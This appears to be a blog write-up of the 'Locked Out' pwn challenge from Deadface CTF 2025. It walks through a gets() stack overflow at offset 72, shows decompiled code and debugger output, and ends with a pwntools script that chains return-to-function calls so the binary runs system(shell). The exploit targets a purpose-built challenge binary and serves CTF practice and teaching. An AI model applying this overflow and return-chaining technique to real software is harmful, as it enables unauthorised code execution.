---
title: PWN - ROP (Deadface CTF 2025)
permalink: 2025/10/26/pwn1-deadface2025/
disableNunjucks: true
date: '2025-10-26T07:46:40.000Z'
updated: '2025-10-26T07:57:01.620Z'
tags:
  - CTF
  - ROP
  - Ret2Libc
categories:
  - Writeup
cover: /cover/deadface2025.png
top_img: https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/d96bb958-4e6c-4ce0-9447-fbe226fbbecf/df3ce2g-46bc6c43-3baf-4388-b84a-6c49031e2f5b.jpg
---

I will make a slight change on how the article will be. Instead of one CTF per article, I will make one challenge per article. This will ensure to ease my future writeup reference

## Locked Out

Points: 100

Created By: @SpiffyLich

### Desc:

We found this program on one of the old drives DEADFACE threw out. We think they’re using it on a server somewhere as a way for members to ‘log in…’ and to keep other people out.

No password seems to work. Looking it over, it seems vulnerable enough— but how on earth do you open a lock with no key?

Submit the flag as deadface{flag text}.

[Download ZIP](https://tinyurl.com/j6ne2w5m)

SHA1: 57c90bfab249ef976846cce8fc586860a2ec7447

env01.deadface.io:9999

### Solution

running the file normally:  

```plaintext
syihab@uky0v1s$ ./lockpick
PROGRAM SECURED...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⠟⠉⠀⠀⠀⠈⠙⠿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠉⠉⠛⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡶⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣶⣶⣶⣶⣶⣾⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠉⠉⠉⠀⠀
How do you open a lock with no key?
a
Trying to unlock...
darn, not the right order...
```

Testing buffer overflow by giving 100 bytes of input:  

```plaintext
syihab@uky0v1s$ ./lockpick
PROGRAM SECURED...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⠟⠉⠀⠀⠀⠈⠙⠿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠉⠉⠛⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡶⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣶⣶⣶⣶⣶⣾⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠉⠉⠉⠀⠀
How do you open a lock with no key?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Segmentation fault (core dumped)
```

Decompiled Code:  

```c
void pick1(void)

{
  if (pin4 == 1) {
    puts("Pin 1 clicked!");
    pin1 = 1;
    return;
  }
  puts("The Lock resists... a pin was skipped!");
                    // WARNING: Subroutine does not return
  exit(0);
}
```

  

```c
void pick2(void)

{
  if (pin1 == 1) {
    puts("Pin 2 clicked!");
    pin2 = 1;
    strcpy(shell,TrueShell);
    return;
  }
  puts("The Lock resists... a pin was skipped!");
                    // WARNING: Subroutine does not return
  exit(0);
}
```

  

```c
void pick3(void)

{
  puts("Pin 3 clicked!");
  pin3 = 1;
  return;
}
```

  

```c
void pick4(void)

{
  if (pin5 == 1) {
    puts("Pin 4 clicked!");
    pin4 = 1;
    return;
  }
  puts("The Lock resists... a pin was skipped!");
                    // WARNING: Subroutine does not return
  exit(0);
}
```

  

```c
void pick5(void)

{
  if (pin3 == 1) {
    puts("Pin 5 clicked!");
    pin5 = 1;
    return;
  }
  puts("The Lock resists... a pin was skipped!");
                    // WARNING: Subroutine does not return
  exit(0);
}
```

  

```c
void vuln(void)

{
  char local_48 [64];
  
  puts("PROGRAM SECURED... ");
  print_lock();
  puts("How do you open a lock with no key?");
  gets(local_48);
  return;
}
```

  

```c
undefined8 main(void)

{
  setbuf(stdout,(char *)0x0);
  vuln();
  puts("Trying to unlock...");
  if ((((pin1 == 1) && (pin2 == 1)) && (pin3 == 1)) && ((pin4 == 1 && (pin5 == 1)))) {
    system(shell);
  }
  else {
    puts("darn, not the right order...");
  }
  return 0;
}
```

TLDR:  
`gets()` in `vuln()` lets us overwrite RIP and call the “pin” functions in the only valid dependency order. That sets all globals and copies the real command into shell. We then return to main so the program rechecks the pins and runs system(shell).

Pin setters (with deps):

`pick3()` → sets `pin3` (no precondition)

`pick5()` → requires `pin3==1`

`pick4()` → requires `pin5==1`

`pick1()` → requires `pin4==1`

`pick2()` → requires `pin1==1`, and does strcpy(shell, TrueShell)

If a precondition fails, the function calls exit(0).

* * *

**Vulnerability**

-   Buffer overflow via `gets()` in `vuln()` (no bounds checking).
    
-   Typical x64 overflow offset: `64 (buf) + 8 (saved RBP)` = 72 bytes.
    

![image](https://github.com/user-attachments/assets/fe33b696-5da3-407f-b300-1daf67bc1994)

```plaintext
pwndbg> cyclic -l jaaaaaaa
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
```

* * *

**Exploit Idea**

Use a `ret2func` chain to call pin setters in the only safe order that avoids exit(0):

Order:  
pick3 → pick5 → pick4 → pick1 → pick2 → main

Solve Script

```python
from pwn import *

# Start program
io = process('./lockpick')
# io = remote('env01.deadface.io',9999)

elf = ELF("./lockpick", checksec=False)
pick3 = elf.symbols['pick3']
pick5 = elf.symbols['pick5']
pick4 = elf.symbols['pick4']
pick1 = elf.symbols['pick1']
pick2 = elf.symbols['pick2']
main  = elf.symbols['main']

ret = p64(0x000000000040101a)

offset = 72

payload = b'A' * offset
payload += ret + p64(pick3)
payload += ret + p64(pick5)
payload += ret + p64(pick4)
payload += ret + p64(pick1)
payload += ret + p64(pick2)
payload += ret + p64(main)


io.recvuntil(b'How do you open a lock with no key?\n')
io.sendline(payload)
io.recvuntil(b'How do you open a lock with no key?\n')
io.sendline(b'')
io.interactive()
```
